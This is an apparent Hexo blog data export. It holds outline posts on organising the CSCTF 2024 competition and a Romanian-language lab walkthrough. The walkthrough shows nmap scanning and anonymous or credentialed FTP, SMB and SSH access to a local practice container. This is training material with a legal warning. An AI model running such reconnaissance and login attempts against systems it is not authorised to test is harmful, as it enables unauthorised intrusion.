Flags\"></a>Evolving Dynamic Flags</h3><p>Offer a glimpse into potential improvements or adaptations for dynamic flags in future editions of SMCC. Discuss plans to refine their implementation, based on lessons learned and participant feedback.</p>\n<br>\n\n<br>\n\n<hr>\n<hr>\n","excerpt":"<hr>\n<blockquote>\n<p>Dynamic flags - generate a new flag every 5 minutes to impose automation and fight flag stealing.</p>\n</blockquote>\n<hr>","more":"<br>\n\n<h2 id=\"Introduction-to-Dynamic-Flags\"><a href=\"#Introduction-to-Dynamic-Flags\" class=\"headerlink\" title=\"Introduction to Dynamic Flags\"></a>Introduction to Dynamic Flags</h2><p>Welcome to the exploration of Dynamic Flags within the captivating CTF challenges at SMCC 2024! This blog post delves into the innovative use of dynamic flags, their role in deterring cheating, and their impact on user engagement and automation.</p>\n<br>\n\n<h3 id=\"Purpose-and-Significance\"><a href=\"#Purpose-and-Significance\" class=\"headerlink\" title=\"Purpose and Significance\"></a>Purpose and Significance</h3><p>Highlight the role of dynamic flags in enhancing the integrity of the CTF challenges. Emphasize their significance in reducing cheating instances and promoting fair gameplay among participants.</p>\n<br>\n\n<h3 id=\"Automation-and-Challenge-Difficulty\"><a href=\"#Automation-and-Challenge-Difficulty\" class=\"headerlink\" title=\"Automation and Challenge Difficulty\"></a>Automation and Challenge Difficulty</h3><p>Discuss how dynamic flags added complexity by requiring automation for certain processes. Explain their role in elevating the difficulty level of challenges, catering to participants with advanced skill sets.</p>\n<br>\n\n<h2 id=\"Implementation-and-Mechanism\"><a href=\"#Implementation-and-Mechanism\" class=\"headerlink\" title=\"Implementation and Mechanism\"></a>Implementation and Mechanism</h2><br>\n\n<h3 id=\"Dynamic-Flag-Update-Cycle\"><a href=\"#Dynamic-Flag-Update-Cycle\" class=\"headerlink\" title=\"Dynamic Flag Update Cycle\"></a>Dynamic Flag Update Cycle</h3><p>Detail the mechanism of dynamic flags, explaining how a script updates these flags in the database at regular intervals, say every 5 minutes. Emphasize the importance of this cycle in ensuring up-to-date flags and detecting potential cheating attempts.</p>\n<br>\n\n<h3 id=\"Log-Monitoring-and-Cheating-Detection\"><a href=\"#Log-Monitoring-and-Cheating-Detection\" class=\"headerlink\" title=\"Log Monitoring and Cheating Detection\"></a>Log Monitoring and Cheating Detection</h3><p>Explain how the logs capture flag updates, allowing organizers to track flag changes and potentially identify cheating behaviors. Showcase the significance of dynamic flags in providing an added layer of security and fairness.</p>\n<br>\n\n<h2 id=\"User-Experience-and-Transparency\"><a href=\"#User-Experience-and-Transparency\" class=\"headerlink\" title=\"User Experience and Transparency\"></a>User Experience and Transparency</h2><br>\n\n<h3 id=\"Challenge-Description-Clarity\"><a href=\"#Challenge-Description-Clarity\" class=\"headerlink\" title=\"Challenge Description Clarity\"></a>Challenge Description Clarity</h3><p>Highlight how challenge descriptions specify the usage of dynamic flags, informing participants of their presence in certain exercises. Emphasize transparency in ensuring participants are aware of the challenge dynamics.</p>\n<br>\n\n<h3 id=\"Dedicated-CTFd-Page-for-Dynamic-Flags\"><a href=\"#Dedicated-CTFd-Page-for-Dynamic-Flags\" class=\"headerlink\" title=\"Dedicated CTFd Page for Dynamic Flags\"></a>Dedicated CTFd Page for Dynamic Flags</h3><p>Discuss the creation of a dedicated page on the CTFd website, detailing exercises with dynamic flags. Explain how this page educates participants about these flags, offering insights into their functionality and purpose.</p>\n<br>\n\n<h2 id=\"Impact-and-Feedback\"><a href=\"#Impact-and-Feedback\" class=\"headerlink\" title=\"Impact and Feedback\"></a>Impact and Feedback</h2><br>\n\n<h3 id=\"Enhanced-Engagement\"><a href=\"#Enhanced-Engagement\" class=\"headerlink\" title=\"Enhanced Engagement\"></a>Enhanced Engagement</h3><p>Discuss the impact of dynamic flags on user engagement, encouraging participants to adapt and develop strategies for real-time flag retrieval.</p>\n<br>\n\n<h3 id=\"Participant-Reception\"><a href=\"#Participant-Reception\" class=\"headerlink\" title=\"Participant Reception\"></a>Participant Reception</h3><p>Share insights into participant feedback regarding dynamic flags, showcasing positive responses or any challenges faced by contestants. Highlight learnings and potential improvements based on user experiences.</p>\n<br>\n\n<h2 id=\"Future-Iterations-and-Improvements\"><a href=\"#Future-Iterations-and-Improvements\" class=\"headerlink\" title=\"Future Iterations and Improvements\"></a>Future Iterations and Improvements</h2><br>\n\n<h3 id=\"Evolving-Dynamic-Flags\"><a href=\"#Evolving-Dynamic-Flags\" class=\"headerlink\" title=\"Evolving Dynamic Flags\"></a>Evolving Dynamic Flags</h3><p>Offer a glimpse into potential improvements or adaptations for dynamic flags in future editions of SMCC. Discuss plans to refine their implementation, based on lessons learned and participant feedback.</p>\n<br>\n\n<br>\n\n<hr>\n<hr>"},{"title":"2.2. CSCTF 2024 - Challenges - Containers","toc":true,"_content":"\n---\n> Containers - approaches to containerization of environments in secure and simple ways\n\n---\n<!-- more -->\n\n<br>\n\n## What is Docker\n\n<br>\n\n## Usefulness\n\n<br>\n\n## Debugging\n- Learn how everything works\n- A better approach: debug from the inside\n\n\n\n<br>\n\n---\n---","source":"_posts/CTFs/CSCTF 2024/2. Challenges/2.md","raw":"---\ntitle: 2.2. CSCTF 2024 - Challenges - Containers\ncategories:\n  - CTFs\n  - CSCTF 2024\n  - 2. Challenges\ntags:\n  - CTFs\n  - CSCTF 2024\n  - How to organize a CTF competition\n  - Challenges\n  - Containers\ntoc: true\n---\n\n---\n> Containers - approaches to containerization of environments in secure and simple ways\n\n---\n<!-- more -->\n\n<br>\n\n## What is Docker\n\n<br>\n\n## Usefulness\n\n<br>\n\n## Debugging\n- Learn how everything works\n- A better approach: debug from the inside\n\n\n\n<br>\n\n---\n---","slug":"CTFs/CSCTF 2024/2. Challenges/2","published":1,"date":"2024-09-23T06:18:55.839Z","updated":"2024-09-23T06:18:55.839Z","comments":1,"layout":"post","photos":[],"_id":"cm1emkmia002e6gvg10av57tv","content":"<hr>\n<blockquote>\n<p>Containers - approaches to containerization of environments in secure and simple ways</p>\n</blockquote>\n<hr>\n<span id=\"more\"></span>\n\n<br>\n\n<h2 id=\"What-is-Docker\"><a href=\"#What-is-Docker\" class=\"headerlink\" title=\"What is Docker\"></a>What is Docker</h2><br>\n\n<h2 id=\"Usefulness\"><a href=\"#Usefulness\" class=\"headerlink\" title=\"Usefulness\"></a>Usefulness</h2><br>\n\n<h2 id=\"Debugging\"><a href=\"#Debugging\" class=\"headerlink\" title=\"Debugging\"></a>Debugging</h2><ul>\n<li>Learn how everything works</li>\n<li>A better approach: debug from the inside</li>\n</ul>\n<br>\n\n<hr>\n<hr>\n","excerpt":"<hr>\n<blockquote>\n<p>Containers - approaches to containerization of environments in secure and simple ways</p>\n</blockquote>\n<hr>","more":"<br>\n\n<h2 id=\"What-is-Docker\"><a href=\"#What-is-Docker\" class=\"headerlink\" title=\"What is Docker\"></a>What is Docker</h2><br>\n\n<h2 id=\"Usefulness\"><a href=\"#Usefulness\" class=\"headerlink\" title=\"Usefulness\"></a>Usefulness</h2><br>\n\n<h2 id=\"Debugging\"><a href=\"#Debugging\" class=\"headerlink\" title=\"Debugging\"></a>Debugging</h2><ul>\n<li>Learn how everything works</li>\n<li>A better approach: debug from the inside</li>\n</ul>\n<br>\n\n<hr>\n<hr>"},{"title":"4. CSCTF 2024 - Lessons learned","toc":true,"_content":"\n---\n> Lessons learned - knowledge gained and future improvements\n\n---\n<!-- more -->\n\n<br>\n\n## Initial stage\n\n<br>\n\n### Problems\n\n<br>\n\n### Solutions\n\n<br>\n\n## Results\n\n\n<br>\n\n## Documentation\n\n<br>\n\n---\n---","source":"_posts/CTFs/CSCTF 2024/4. Lessons learned/index.md","raw":"---\ntitle: 4. CSCTF 2024 - Lessons learned\ncategories:\n  - CTFs\n  - CSCTF 2024\n  - 4. Lessons learned\ntags:\n  - CTFs\n  - CSCTF 2024\n  - How to organize a CTF competition\n  - Lessons Learned\ntoc: true\n---\n\n---\n> Lessons learned - knowledge gained and future improvements\n\n---\n<!-- more -->\n\n<br>\n\n## Initial stage\n\n<br>\n\n### Problems\n\n<br>\n\n### Solutions\n\n<br>\n\n## Results\n\n\n<br>\n\n## Documentation\n\n<br>\n\n---\n---","slug":"CTFs/CSCTF 2024/4. Lessons learned/index","published":1,"date":"2024-09-23T06:18:55.843Z","updated":"2024-09-23T06:18:55.843Z","comments":1,"layout":"post","photos":[],"_id":"cm1emkmib002i6gvg1iwy2cu1","content":"<hr>\n<blockquote>\n<p>Lessons learned - knowledge gained and future improvements</p>\n</blockquote>\n<hr>\n<span id=\"more\"></span>\n\n<br>\n\n<h2 id=\"Initial-stage\"><a href=\"#Initial-stage\" class=\"headerlink\" title=\"Initial stage\"></a>Initial stage</h2><br>\n\n<h3 id=\"Problems\"><a href=\"#Problems\" class=\"headerlink\" title=\"Problems\"></a>Problems</h3><br>\n\n<h3 id=\"Solutions\"><a href=\"#Solutions\" class=\"headerlink\" title=\"Solutions\"></a>Solutions</h3><br>\n\n<h2 id=\"Results\"><a href=\"#Results\" class=\"headerlink\" title=\"Results\"></a>Results</h2><br>\n\n<h2 id=\"Documentation\"><a href=\"#Documentation\" class=\"headerlink\" title=\"Documentation\"></a>Documentation</h2><br>\n\n<hr>\n<hr>\n","excerpt":"<hr>\n<blockquote>\n<p>Lessons learned - knowledge gained and future improvements</p>\n</blockquote>\n<hr>","more":"<br>\n\n<h2 id=\"Initial-stage\"><a href=\"#Initial-stage\" class=\"headerlink\" title=\"Initial stage\"></a>Initial stage</h2><br>\n\n<h3 id=\"Problems\"><a href=\"#Problems\" class=\"headerlink\" title=\"Problems\"></a>Problems</h3><br>\n\n<h3 id=\"Solutions\"><a href=\"#Solutions\" class=\"headerlink\" title=\"Solutions\"></a>Solutions</h3><br>\n\n<h2 id=\"Results\"><a href=\"#Results\" class=\"headerlink\" title=\"Results\"></a>Results</h2><br>\n\n<h2 id=\"Documentation\"><a href=\"#Documentation\" class=\"headerlink\" title=\"Documentation\"></a>Documentation</h2><br>\n\n<hr>\n<hr>"},{"title":"3.2. Discord - Community - Marketing","toc":true,"_content":"\n---\n> Marketing - interact and attract users before the CTF starts.\n\n---\n<!-- more -->\n\n<br>\n\n## Documentation \n\n<br>\n\n\n\n\n<br>\n\n---\n---","source":"_posts/CTFs/CSCTF 2024/3. Community/2.md","raw":"---\ntitle: 3.2. Discord - Community - Marketing\ncategories:\n  - CTFs\n  - CSCTF 2024\n  - 3. Community\ntags:\n  - CTFs\n  - CSCTF 2024\n  - How to organize a CTF competition\n  - Community\n  - Marketing\ntoc: true\n---\n\n---\n> Marketing - interact and attract users before the CTF starts.\n\n---\n<!-- more -->\n\n<br>\n\n## Documentation \n\n<br>\n\n\n\n\n<br>\n\n---\n---","slug":"CTFs/CSCTF 2024/3. Community/2","published":1,"date":"2024-09-23T06:18:55.841Z","updated":"2024-09-23T06:18:55.842Z","comments":1,"layout":"post","photos":[],"_id":"cm1emkmid002m6gvg8jb1dpfa","content":"<hr>\n<blockquote>\n<p>Marketing - interact and attract users before the CTF starts.</p>\n</blockquote>\n<hr>\n<span id=\"more\"></span>\n\n<br>\n\n<h2 id=\"Documentation\"><a href=\"#Documentation\" class=\"headerlink\" title=\"Documentation\"></a>Documentation</h2><br>\n\n\n\n\n<br>\n\n<hr>\n<hr>\n","excerpt":"<hr>\n<blockquote>\n<p>Marketing - interact and attract users before the CTF starts.</p>\n</blockquote>\n<hr>","more":"<br>\n\n<h2 id=\"Documentation\"><a href=\"#Documentation\" class=\"headerlink\" title=\"Documentation\"></a>Documentation</h2><br>\n\n\n\n\n<br>\n\n<hr>\n<hr>"},{"title":"3.1. CSCTF 2024 - Community - Discord","toc":true,"_content":"\n---\n> Discord - socializing platform used to create a community and transmit announcements.\n\n---\n<!-- more -->\n\n<br>\n\n## Community server\n\n<br>\n\n## Channels\n\n<br>\n\n## Integrations\n\n<br>\n\n## Bots and applications\n\n<br>\n\n### 1. First-blood\n- connect to CTFd\n\n<br>\n\n### 2. Ticket tool\n- solve users' problems\n\n<br>\n\n### 3. MEE6\n- verify and give permissions to users\n\n<br>\n\n### 4. NullCTF_d \n- query TCF-related commands\n\n<br>\n\n### 5. Custom meme webhook\n- send memes\n\n<br>\n\n## Roles and permissions\n- sort and adapt\n\n<br>\n\n### Roles\n- admin\n- verified\n- user\n- ticket\n\n<br>\n\n### Permissions\n- full access\n- read and react only\n- write \n\n<br>\n\n## CTF commands\n- setup\n- commands\n\n\n<br>\n\n---\n---","source":"_posts/CTFs/CSCTF 2024/3. Community/1.md","raw":"---\ntitle: 3.1. CSCTF 2024 - Community - Discord\ncategories:\n  - CTFs\n  - CSCTF 2024\n  - 3. Community\ntags:\n  - CTFs\n  - CSCTF 2024\n  - How to organize a CTF competition\n  - Community\n  - Discord\ntoc: true\n---\n\n---\n> Discord - socializing platform used to create a community and transmit announcements.\n\n---\n<!-- more -->\n\n<br>\n\n## Community server\n\n<br>\n\n## Channels\n\n<br>\n\n## Integrations\n\n<br>\n\n## Bots and applications\n\n<br>\n\n### 1. First-blood\n- connect to CTFd\n\n<br>\n\n### 2. Ticket tool\n- solve users' problems\n\n<br>\n\n### 3. MEE6\n- verify and give permissions to users\n\n<br>\n\n### 4. NullCTF_d \n- query TCF-related commands\n\n<br>\n\n### 5. Custom meme webhook\n- send memes\n\n<br>\n\n## Roles and permissions\n- sort and adapt\n\n<br>\n\n### Roles\n- admin\n- verified\n- user\n- ticket\n\n<br>\n\n### Permissions\n- full access\n- read and react only\n- write \n\n<br>\n\n## CTF commands\n- setup\n- commands\n\n\n<br>\n\n---\n---","slug":"CTFs/CSCTF 2024/3. Community/1","published":1,"date":"2024-09-23T06:18:55.840Z","updated":"2024-09-23T06:18:55.841Z","comments":1,"layout":"post","photos":[],"_id":"cm1emkmie002q6gvgh5vddgp2","content":"<hr>\n<blockquote>\n<p>Discord - socializing platform used to create a community and transmit announcements.</p>\n</blockquote>\n<hr>\n<span id=\"more\"></span>\n\n<br>\n\n<h2 id=\"Community-server\"><a href=\"#Community-server\" class=\"headerlink\" title=\"Community server\"></a>Community server</h2><br>\n\n<h2 id=\"Channels\"><a href=\"#Channels\" class=\"headerlink\" title=\"Channels\"></a>Channels</h2><br>\n\n<h2 id=\"Integrations\"><a href=\"#Integrations\" class=\"headerlink\" title=\"Integrations\"></a>Integrations</h2><br>\n\n<h2 id=\"Bots-and-applications\"><a href=\"#Bots-and-applications\" class=\"headerlink\" title=\"Bots and applications\"></a>Bots and applications</h2><br>\n\n<h3 id=\"1-First-blood\"><a href=\"#1-First-blood\" class=\"headerlink\" title=\"1. First-blood\"></a>1. First-blood</h3><ul>\n<li>connect to CTFd</li>\n</ul>\n<br>\n\n<h3 id=\"2-Ticket-tool\"><a href=\"#2-Ticket-tool\" class=\"headerlink\" title=\"2. Ticket tool\"></a>2. Ticket tool</h3><ul>\n<li>solve users problems</li>\n</ul>\n<br>\n\n<h3 id=\"3-MEE6\"><a href=\"#3-MEE6\" class=\"headerlink\" title=\"3. MEE6\"></a>3. MEE6</h3><ul>\n<li>verify and give permissions to users</li>\n</ul>\n<br>\n\n<h3 id=\"4-NullCTF-d\"><a href=\"#4-NullCTF-d\" class=\"headerlink\" title=\"4. NullCTF_d\"></a>4. NullCTF_d</h3><ul>\n<li>query TCF-related commands</li>\n</ul>\n<br>\n\n<h3 id=\"5-Custom-meme-webhook\"><a href=\"#5-Custom-meme-webhook\" class=\"headerlink\" title=\"5. Custom meme webhook\"></a>5. Custom meme webhook</h3><ul>\n<li>send memes</li>\n</ul>\n<br>\n\n<h2 id=\"Roles-and-permissions\"><a href=\"#Roles-and-permissions\" class=\"headerlink\" title=\"Roles and permissions\"></a>Roles and permissions</h2><ul>\n<li>sort and adapt</li>\n</ul>\n<br>\n\n<h3 id=\"Roles\"><a href=\"#Roles\" class=\"headerlink\" title=\"Roles\"></a>Roles</h3><ul>\n<li>admin</li>\n<li>verified</li>\n<li>user</li>\n<li>ticket</li>\n</ul>\n<br>\n\n<h3 id=\"Permissions\"><a href=\"#Permissions\" class=\"headerlink\" title=\"Permissions\"></a>Permissions</h3><ul>\n<li>full access</li>\n<li>read and react only</li>\n<li>write</li>\n</ul>\n<br>\n\n<h2 id=\"CTF-commands\"><a href=\"#CTF-commands\" class=\"headerlink\" title=\"CTF commands\"></a>CTF commands</h2><ul>\n<li>setup</li>\n<li>commands</li>\n</ul>\n<br>\n\n<hr>\n<hr>\n","excerpt":"<hr>\n<blockquote>\n<p>Discord - socializing platform used to create a community and transmit announcements.</p>\n</blockquote>\n<hr>","more":"<br>\n\n<h2 id=\"Community-server\"><a href=\"#Community-server\" class=\"headerlink\" title=\"Community server\"></a>Community server</h2><br>\n\n<h2 id=\"Channels\"><a href=\"#Channels\" class=\"headerlink\" title=\"Channels\"></a>Channels</h2><br>\n\n<h2 id=\"Integrations\"><a href=\"#Integrations\" class=\"headerlink\" title=\"Integrations\"></a>Integrations</h2><br>\n\n<h2 id=\"Bots-and-applications\"><a href=\"#Bots-and-applications\" class=\"headerlink\" title=\"Bots and applications\"></a>Bots and applications</h2><br>\n\n<h3 id=\"1-First-blood\"><a href=\"#1-First-blood\" class=\"headerlink\" title=\"1. First-blood\"></a>1. First-blood</h3><ul>\n<li>connect to CTFd</li>\n</ul>\n<br>\n\n<h3 id=\"2-Ticket-tool\"><a href=\"#2-Ticket-tool\" class=\"headerlink\" title=\"2. Ticket tool\"></a>2. Ticket tool</h3><ul>\n<li>solve users problems</li>\n</ul>\n<br>\n\n<h3 id=\"3-MEE6\"><a href=\"#3-MEE6\" class=\"headerlink\" title=\"3. MEE6\"></a>3. MEE6</h3><ul>\n<li>verify and give permissions to users</li>\n</ul>\n<br>\n\n<h3 id=\"4-NullCTF-d\"><a href=\"#4-NullCTF-d\" class=\"headerlink\" title=\"4. NullCTF_d\"></a>4. NullCTF_d</h3><ul>\n<li>query TCF-related commands</li>\n</ul>\n<br>\n\n<h3 id=\"5-Custom-meme-webhook\"><a href=\"#5-Custom-meme-webhook\" class=\"headerlink\" title=\"5. Custom meme webhook\"></a>5. Custom meme webhook</h3><ul>\n<li>send memes</li>\n</ul>\n<br>\n\n<h2 id=\"Roles-and-permissions\"><a href=\"#Roles-and-permissions\" class=\"headerlink\" title=\"Roles and permissions\"></a>Roles and permissions</h2><ul>\n<li>sort and adapt</li>\n</ul>\n<br>\n\n<h3 id=\"Roles\"><a href=\"#Roles\" class=\"headerlink\" title=\"Roles\"></a>Roles</h3><ul>\n<li>admin</li>\n<li>verified</li>\n<li>user</li>\n<li>ticket</li>\n</ul>\n<br>\n\n<h3 id=\"Permissions\"><a href=\"#Permissions\" class=\"headerlink\" title=\"Permissions\"></a>Permissions</h3><ul>\n<li>full access</li>\n<li>read and react only</li>\n<li>write</li>\n</ul>\n<br>\n\n<h2 id=\"CTF-commands\"><a href=\"#CTF-commands\" class=\"headerlink\" title=\"CTF commands\"></a>CTF commands</h2><ul>\n<li>setup</li>\n<li>commands</li>\n</ul>\n<br>\n\n<hr>\n<hr>"},{"title":"ixodron 2024 - Demo 1","date":"2024-09-03T07:00:00.000Z","toc":true,"_content":"\n---\n> Primul set de exerciii din seria de `Demo`-uri\n\n---\n<!-- more -->\n\n<br>\n\n## 1. Scanarea reelei\n> n aceast etap, vom folosi comanda `nmap` pentru a descoperi ce servicii ruleaz pe containerul **Docker** descrcat. Vom afla ce porturi sunt deschise i ce servicii sunt active, cum ar fi **FTP**, **SMB** i **SSH**.\n\n**1.1. Alegerea reelei**\n```\nLegal advice: don't try to hack anything that you don't own or don't have explicit consent of.\n```\n\n> Vom descrca un **container** tip **Docker**.\n> **Docker** este folosit zilnic n dezvoltare i securitate pentru a crea medii izolate, replicabile. \n> Este popular n CTF-uri i teste de penetrare pentru simularea mediilor de reea.\n\n**1.2. Descrcarea unui container docker ales**\n> Instalam programul `docker`\n```bash\nsudo apt update\nsudo apt install -y docker.io\n```\n> Containerul se numete `ixo-network-recon`, versiunea `2.0`\n> Extragem imaginea containerului \n```bash\nsudo docker pull chronospkk/ixo-network-recon:2.0\n```\n> Rulm container-ul \n```bash\nsudo docker run -d --name ixo ixo-network-recon:2.0\n```\n> Verificm execuia\n```bash\nsudo docker ps\n```\n\n**1.3. Scanarea reelei interne cu un tool dedicat: `nmap`**\n> Identificm interfeele de reea (ale mainii virtuale)\n```bash\nip a s\nifconfig\n```\n> Scanm reeaua n care se afl containerul `Docker`\n```bash\nnmap -sn -T4 172.17.0.1/24 -oN nmap.network\n```\n| Argument\t| Descriere |\n| -- | -- |\n|`-sn`\t| Nu scaneaz porturi |\n|`-T4`\t| Scanare rapid (viteza 4/5) |\n|`172.17.0.1/24`\t| Reeaua int |\n|`-oN nmap.network`\t| Salveaz rezultatul ntr-un fiier text |\n\n\n**1.4. Scanare mainii int**\n> scanm containerul `Docker`\n```bash\nnmap -Pn -T4 -sV -v 172.17.0.2 -oN nmap.host\n```\n| Argument\t| Descriere |\n| -- | -- |\n|`-Pn`\t| Nu ncerca `host discovery` (no ping) |\n|`-T4`\t| Scanare rapid (viteza 4/5) |\n|`-sV`\t| Detectarea versiunii serviciilor |\n|`-v`\t| Verbose output - afieaz mai multe detalii |\n|`--max-retries 5`\t| Retransmite cererea de conectare doar de 5 ori (10 este default) |\n|`172.17.0.2`\t| IP-ul int |\n|`-oN nmap.host`\t| Salveaz rezultatul ntr-un fiier text |\n\n\n<br>\n<br>\n\n\n## 2. Server FTP\n> **FTP** (File Transfer Protocol) este un protocol vechi folosit pentru transferul de fiiere ntre client i server. \n> Este nc utilizat, n special pentru transferul fiierelor mari n infrastructuri care nu au adoptat alternative moderne (ex. **SFTP**). \n> **FTP** poate permite acces anonim sau autentificat i este frecvent ntlnit n reele vechi sau nesecurizate. \n> Cu toate acestea, din cauza lipsei criptrii, este considerat nesigur.\n\n\n**Conectare anonim la serverul FTP**\n```bash 1\nftp 172.17.0.2\n# Username: anonymous\n```\n```bash 2\nftp anonymous@172.17.0.2\n```\n\n\n**Conectare autentificat la serverul FTP**\n```bash \nftp ftp_user@172.17.0.2\n#Password: ftp_password_123!\n```\n\n\n<br>\n<br>\n\n\n## 3. Server SMB\n> **SMB** (Server Message Block) este folosit pentru partajarea fiierelor i imprimantelor n reelele locale, mai ales n reelele de birouri bazate pe Windows. \n> Acesta permite utilizatorilor s colaboreze pe aceleai fiiere din reea, oferind acces autenticat sau public la foldere i fiiere partajate. \n> **SMB** este un protocol esenial n multe infrastructuri de dimensiuni mari.\n\n**3.1. Enumerarea automat a serverului SMB**\n```bash Ce foldere sunt partajate i ce acces avem la ele?\nsmbmap -H $IP\n```\n\n```bash La ce fiiere avem acces?\nsmbmap -H $IP -r\n```\n```bash Specificm un folder pe care vrem s l enumerm\nsmbmap -H $IP -r public\nsmbmap -H $IP -r private\n```\n```bash Enumerare automat cu autentificare\nsmbmap -H $IP -u smb_user -p 'smb_password_123!'\nsmbmap -H $IP -u smb_user -p 'smb_password_123!' -r\n```\n\n<br>\n\n**3.2. Conectare anonim la serverul SMB**\n```bash Conectare la serverul SMB\nsmbclient -N //172.17.0.2/public \n```\n\n<br>\n\n**3.2. Conectare autentificat la serverul SMB**\n```bash Conectare la serverul SMB\nsmbclient //172.17.0.2/private -U smb_user%'smb_password_123!'\n```\n\n<br>\n\n## 4. Server SSH\n> **SSH** (Secure Shell) este protocolul standard pentru acces securizat la servere de la distan. \n> **SSH** este criptat i ofer autentificare prin parole sau chei publice/private, fiind folosit n mod obinuit pentru administrarea serverelor. \n> Este esenial pentru sysadmini i devops, fiind folosit zilnic pentru accesul la servere sau la maini virtuale.\n\n\n```bash Conectare la serverul SSH\nssh ssh_user@172.17.0.2\n# Password: ssh_password_123!\n```\n\n<br>\n<br>\n\n<p style=\"text-align:center\">\n  <b>NEXT</b>: <a href=\"/CTFs/ixodron/Demo/2/\" target=\"_blank\">Demo 2</a>\n</p>\n\n---\n---","source":"_posts/CTFs/ixodron/Demo/1.md","raw":"---\ntitle: ixodron 2024 - Demo 1\ndate: 2024-09-03 10:00:00\ncategories:\n  - CTFs\n  - ixodron 2024\n  - 2. Demo\ntags:\n  - CTFs\n  - ixodron 2024\n  - Demo\ntoc: true\n---\n\n---\n> Primul set de exerciii din seria de `Demo`-uri\n\n---\n<!-- more -->\n\n<br>\n\n## 1. Scanarea reelei\n> n aceast etap, vom folosi comanda `nmap` pentru a descoperi ce servicii ruleaz pe containerul **Docker** descrcat. Vom afla ce porturi sunt deschise i ce servicii sunt active, cum ar fi **FTP**, **SMB** i **SSH**.\n\n**1.1. Alegerea reelei**\n```\nLegal advice: don't try to hack anything that you don't own or don't have explicit consent of.\n```\n\n> Vom descrca un **container** tip **Docker**.\n> **Docker** este folosit zilnic n dezvoltare i securitate pentru a crea medii izolate, replicabile. \n> Este popular n CTF-uri i teste de penetrare pentru simularea mediilor de reea.\n\n**1.2. Descrcarea unui container docker ales**\n> Instalam programul `docker`\n```bash\nsudo apt update\nsudo apt install -y docker.io\n```\n> Containerul se numete `ixo-network-recon`, versiunea `2.0`\n> Extragem imaginea containerului \n```bash\nsudo docker pull chronospkk/ixo-network-recon:2.0\n```\n> Rulm container-ul \n```bash\nsudo docker run -d --name ixo ixo-network-recon:2.0\n```\n> Verificm execuia\n```bash\nsudo docker ps\n```\n\n**1.3. Scanarea reelei interne cu un tool dedicat: `nmap`**\n> Identificm interfeele de reea (ale mainii virtuale)\n```bash\nip a s\nifconfig\n```\n> Scanm reeaua n care se afl containerul `Docker`\n```bash\nnmap -sn -T4 172.17.0.1/24 -oN nmap.network\n```\n| Argument\t| Descriere |\n| -- | -- |\n|`-sn`\t| Nu scaneaz porturi |\n|`-T4`\t| Scanare rapid (viteza 4/5) |\n|`172.17.0.1/24`\t| Reeaua int |\n|`-oN nmap.network`\t| Salveaz rezultatul ntr-un fiier text |\n\n\n**1.4. Scanare mainii int**\n> scanm containerul `Docker`\n```bash\nnmap -Pn -T4 -sV -v 172.17.0.2 -oN nmap.host\n```\n| Argument\t| Descriere |\n| -- | -- |\n|`-Pn`\t| Nu ncerca `host discovery` (no ping) |\n|`-T4`\t| Scanare rapid (viteza 4/5) |\n|`-sV`\t| Detectarea versiunii serviciilor |\n|`-v`\t| Verbose output - afieaz mai multe detalii |\n|`--max-retries 5`\t| Retransmite cererea de conectare doar de 5 ori (10 este default) |\n|`172.17.0.2`\t| IP-ul int |\n|`-oN nmap.host`\t| Salveaz rezultatul ntr-un fiier text |\n\n\n<br>\n<br>\n\n\n## 2. Server FTP\n> **FTP** (File Transfer Protocol) este un protocol vechi folosit pentru transferul de fiiere ntre client i server. \n> Este nc utilizat, n special pentru transferul fiierelor mari n infrastructuri care nu au adoptat alternative moderne (ex. **SFTP**). \n> **FTP** poate permite acces anonim sau autentificat i este frecvent ntlnit n reele vechi sau nesecurizate. \n> Cu toate acestea, din cauza lipsei criptrii, este considerat nesigur.\n\n\n**Conectare anonim la serverul FTP**\n```bash 1\nftp 172.17.0.2\n# Username: anonymous\n```\n```bash 2\nftp anonymous@172.17.0.2\n```\n\n\n**Conectare autentificat la serverul FTP**\n```bash \nftp ftp_user@172.17.0.2\n#Password: ftp_password_123!\n```\n\n\n<br>\n<br>\n\n\n## 3. Server SMB\n> **SMB** (Server Message Block) este folosit pentru partajarea fiierelor i imprimantelor n reelele locale, mai ales n reelele de birouri bazate pe Windows. \n> Acesta permite utilizatorilor s colaboreze pe aceleai fiiere din reea, oferind acces autenticat sau public la foldere i fiiere partajate. \n> **SMB** este un protocol esenial n multe infrastructuri de dimensiuni mari.\n\n**3.1. Enumerarea automat a serverului SMB**\n```bash Ce foldere sunt partajate i ce acces avem la ele?\nsmbmap -H $IP\n```\n\n```bash La ce fiiere avem acces?\nsmbmap -H $IP -r\n```\n```bash Specificm un folder pe care vrem s l enumerm\nsmbmap -H $IP -r public\nsmbmap -H $IP -r private\n```\n```bash Enumerare automat cu autentificare\nsmbmap -H $IP -u smb_user -p 'smb_password_123!'\nsmbmap -H $IP -u smb_user -p 'smb_password_123!' -r\n```\n\n<br>\n\n**3.2. Conectare anonim la serverul SMB**\n```bash Conectare la serverul SMB\nsmbclient -N //172.17.0.2/public \n```\n\n<br>\n\n**3.2. Conectare autentificat la serverul SMB**\n```bash Conectare la serverul SMB\nsmbclient //172.17.0.2/private -U smb_user%'smb_password_123!'\n```\n\n<br>\n\n## 4. Server SSH\n> **SSH** (Secure Shell) este protocolul standard pentru acces securizat la servere de la distan. \n> **SSH** este criptat i ofer autentificare prin parole sau chei publice/private, fiind folosit n mod obinuit pentru administrarea serverelor. \n> Este esenial pentru sysadmini i devops, fiind folosit zilnic pentru accesul la servere sau la maini virtuale.\n\n\n```bash Conectare la serverul SSH\nssh ssh_user@172.17.0.2\n# Password: ssh_password_123!\n```\n\n<br>\n<br>\n\n<p style=\"text-align:center\">\n  <b>NEXT</b>: <a href=\"/CTFs/ixodron/Demo/2/\" target=\"_blank\">Demo 2</a>\n</p>\n\n---\n---","slug":"CTFs/ixodron/Demo/1","published":1,"updated":"2024-09-23T06:18:55.847Z","comments":1,"layout":"post","photos":[],"_id":"cm1emkmif002u6gvg7k8yf2vq","content":"<hr>\n<blockquote>\n<p>Primul set de exerciii din seria de <code>Demo</code>-uri</p>\n</blockquote>\n<hr>\n<span id=\"more\"></span>\n\n<br>\n\n<h2 id=\"1-Scanarea-retelei\"><a href=\"#1-Scanarea-retelei\" class=\"headerlink\" title=\"1. Scanarea reelei\"></a>1. Scanarea reelei</h2><blockquote>\n<p>n aceast etap, vom folosi comanda <code>nmap</code> pentru a descoperi ce servicii ruleaz pe containerul <strong>Docker</strong> descrcat. Vom afla ce porturi sunt deschise i ce servicii sunt active, cum ar fi <strong>FTP</strong>, <strong>SMB</strong> i <strong>SSH</strong>.</p>\n</blockquote>\n<p><strong>1.1. Alegerea reelei</strong></p>\n<pre><code 